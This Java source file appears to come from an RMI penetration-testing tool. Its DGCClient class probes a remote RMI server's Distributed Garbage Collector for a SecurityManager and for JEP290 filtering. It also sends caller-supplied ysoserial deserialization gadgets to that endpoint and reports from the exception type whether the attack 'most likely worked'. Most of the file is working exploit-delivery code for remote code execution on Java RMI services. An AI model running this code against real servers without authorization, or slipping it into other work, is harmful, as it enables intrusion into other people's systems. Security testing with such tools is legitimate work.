package de.qtc.rmg.operations;

import java.io.IOException;
import java.io.Serializable;
import java.net.SocketException;
import java.rmi.UnknownHostException;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteRef;
import java.util.HashMap;

import de.qtc.rmg.io.Logger;
import de.qtc.rmg.utils.RMGUtils;
import de.qtc.rmg.utils.RMIWhisperer;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.StreamRemoteCall;

@SuppressWarnings("restriction")
public class DGCClient {

    private RMIWhisperer rmi;
    private static final long interfaceHash = -669196253586618813L;


    public DGCClient(RMIWhisperer rmiRegistry)
    {
        this.rmi = rmiRegistry;
    }

    public void enumSecurityManager()
    {
        try {
            Logger.printlnBlue("RMI server SecurityManager enumeration:");
            Logger.println("");
            Logger.increaseIndent();

            cleanCall(new DefinitelyNonExistingClass());

        } catch( Exception e ) {

            Throwable t = RMGUtils.getThrowable("ClassNotFoundException", e);
            if( t == null ) {
                Logger.eprintlnYellow("- Caught unexpected exception during SecurityManager enumeration");
                Logger.eprintln("  Please report this to improve rmg :)");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }

            if( t.getMessage().contains("no security manager: RMI class loader disabled") ) {
                Logger.printlnMixedYellow("- RMI server", "does not", "use a security manager.");
                Logger.printlnMixedYellow("  Remote class loading attacks", "are not", "possible.");
            }

            if( t.getMessage().contains("access to class loader denied") ) {
                Logger.printlnMixedYellow("- RMI server", "does", "use a security manager.");
                Logger.printlnMixedYellow("  But access to the class loader", "was denied.");
                Logger.println("  Codebase attacks may work on the application level.");
            }
        } finally {
            Logger.decreaseIndent();
        }
    }

    public void enumJEP290()
    {
        try {
            Logger.printlnBlue("RMI server JEP290 enumeration:");
            Logger.println("");
            Logger.increaseIndent();

            cleanCall(new HashMap<String,String>());

        } catch( Exception e ) {

            Throwable cause = RMGUtils.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                Logger.printMixedYellow("- DGC", "rejected", "deserialization of");
                Logger.printlnPlainBlue(" java.util.HashMap.");
                Logger.printlnMixedYellowFirst("  JEP290", "is most likely", "installed.");

            } else if( cause instanceof java.lang.ClassCastException) {
                Logger.printMixedYellow("- DGC", "accepted", "deserialization of");
                Logger.printlnPlainBlue(" java.util.HashMap.");
                Logger.printlnMixedYellowFirst("  JEP290", "is most likely", "not installed.");
            }
        }
    }

    public void codebaseCleanCall(Object payload)
    {
        try {
            cleanCall(payload);
        } catch( Exception e ) {

        }
    }

    public void attackCleanCall(Object payload)
    {
        try {
            Logger.printlnBlue("Attempting ysoserial attack on DGC endpoint...");
            Logger.increaseIndent();
            cleanCall(payload);
        } catch( Exception e ) {

            Throwable cause = RMGUtils.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                Logger.eprintlnMixedYellow("DGC", "rejected", "deserialization of the supplied gadget.");
                Logger.eprintlnMixedYellowFirst("JEP290", "is most likely", "installed.");
                Logger.eprintln("Deserialization attacks may work at the appliaction layer.");

            } else if( cause instanceof java.lang.ClassNotFoundException) {
                Logger.eprintlnMixedYellow("DGC", "accepted", "deserialization of the supplied gadget.");
                Logger.eprintlnMixedYellow("However, the gadget seems", "not", "to be available on the rmi server.");
                Logger.eprintln("Try a different gadget.");

            } else if( cause instanceof java.lang.ClassCastException) {
                Logger.printlnMixedYellow("Caught", "ClassCastException", "during deserialization attack.");
                Logger.printlnMixedYellowFirst("Deserialization attack", "most likely", "worked :)");
            }
        }
    }

    /**
     * Make a call to the Distributed Garbage Collector (DGC) of an RMI endpoint.
     *
     * @param hostname the targeted hostname where the rmiregistry is located
     * @param port the
     * @param payloadObject
     * @throws Exception
     * @throws IOException
     * @throws UnknownHostException
     * @throws SocketException
     */
    @SuppressWarnings("deprecation")
    public void cleanCall(Object payloadObject) throws Exception
    {
        try {
            Endpoint endpoint = rmi.getEndpoint();
            RemoteRef remoteRef = new UnicastRef(new LiveRef(new ObjID(ObjID.DGC_ID), endpoint, false));

            StreamRemoteCall call = (StreamRemoteCall)remoteRef.newCall(null, null, 0, interfaceHash);
            try {
                java.io.ObjectOutput out = call.getOutputStream();
                out.writeObject(new ObjID[] {});
                out.writeLong(0L);
                out.writeObject(payloadObject);
                out.writeBoolean(true);

            } catch(java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling arguments", e);
            }

            remoteRef.invoke(call);
            remoteRef.done(call);

        } catch(java.rmi.ConnectException e) {
            Logger.eprintlnMixedYellow("Caught", "ConnectException", "during DGC operation.");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();

        } catch(java.rmi.ConnectIOException e) {
            Logger.eprintlnMixedYellow("Caught", "ConnectIOException", "during DGC operation.");
            Logger.eprintlnMixedBlue("Remote endpoint probably uses an", "SSL socket");
            Logger.eprintlnMixedYellow("Retry with the", "--ssl", "option.");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();
        }
    }

    static class DefinitelyNonExistingClass implements Serializable {
        private final static long serialVersionUID = 2L;
    }
}
